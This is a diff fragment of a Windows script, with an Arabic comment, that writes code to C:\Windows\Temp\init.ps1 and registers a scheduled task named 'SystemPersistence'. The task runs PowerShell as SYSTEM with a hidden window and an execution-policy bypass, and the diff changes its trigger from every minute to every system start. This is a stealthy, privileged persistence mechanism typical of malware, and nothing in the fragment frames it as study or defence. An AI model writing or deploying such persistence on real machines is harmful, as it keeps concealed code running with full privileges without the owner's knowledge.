@@ -5,4 +5,4 @@ $code | Out-File -FilePath $targetScript -Encoding ascii
 
 # 2. إنشاء المهمة المجدولة التي تشير فقط إلى مسار الملف (هذا الأمر طوله أقل من 100 حرف)
 schtasks /delete /tn "SystemPersistence" /f
-schtasks /create /tn "SystemPersistence" /sc minute /mo 1 /ru SYSTEM /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\init.ps1" /f
+schtasks /create /tn "SystemPersistence" /sc onstart /ru SYSTEM /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\init.ps1" /f
